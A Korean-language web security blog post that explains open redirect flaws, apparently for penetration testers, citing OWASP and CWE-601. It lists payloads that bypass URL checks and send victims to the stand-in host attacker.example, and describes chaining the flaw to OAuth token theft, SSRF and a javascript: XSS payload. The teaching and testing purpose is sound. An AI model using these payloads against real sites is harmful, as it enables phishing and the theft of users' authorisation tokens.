---
title: "오픈 리다이렉트 (Open Redirect)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Redirect]
tags: [open-redirect, phishing, ssrf, web]
description: "이동 대상을 검증하지 않아 외부 도메인으로 보낼 수 있는 오픈 리다이렉트의 개념과, URL 검증 우회 구문 및 SSRF·OAuth 토큰 탈취 연계를 정리합니다."
mermaid: true
---

> 로그인 후 이동·`next=`·`returnUrl=` 같은 파라미터의 **목적지를 검증하지 않으면**, 신뢰 도메인 링크가 피해자를 공격자 사이트로 보낸다. 피싱·OAuth 토큰 탈취·SSRF의 디딤돌이 된다.

## 개념

리다이렉트 대상을 사용자 입력에서 받고 허용 목록 없이 `Location`에 넣으면 성립한다. 신뢰 도메인으로 시작하는 URL이라 사용자는 안심하고 클릭한다.

```python
return redirect(request.args["next"])   # next=https://attacker.example → 외부 이동
```

## 공격·우회 구문

허가된 범위에서만. 대상은 `attacker.example`로.

### 기본·검증 우회

```
next=https://attacker.example
next=//attacker.example              # 스킴 생략(프로토콜 상대) — 자주 통과
next=/\attacker.example              # 백슬래시(브라우저가 // 로 해석)
next=https:attacker.example
next=https://trusted.com@attacker.example   # @ userinfo
next=https://attacker.example#trusted.com
next=https://attacker.example\.trusted.com
```

### 접두/접미 검사 우회

```
startsWith("https://trusted.com") → https://trusted.com.attacker.example
                                   → https://trusted.com@attacker.example
endsWith("trusted.com") → https://attacker.com/trusted.com, eviltrusted.com
이중 인코딩: %2f%2fattacker.example , %252e
```

### 연계

```
OAuth/SSO redirect_uri 가 오픈 리다이렉트면 → 인가코드·토큰 탈취
서버측 리다이렉트 추종이면 → SSRF 허용목록 우회(ssrf-url-validation-bypass)
XSS: next=javascript:alert(1) (클라이언트 리다이렉트가 location 에 직접 대입 시)
```

### 확인 요령

```
next/url/return/redirect/callback/dest 파라미터 찾기
외부 도메인·// 로 바꿔 Location 응답이 외부로 향하는지
```

## 참고 자료

- [OWASP: Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [CWE-601: URL Redirection to Untrusted Site (Open Redirect)](https://cwe.mitre.org/data/definitions/601.html)
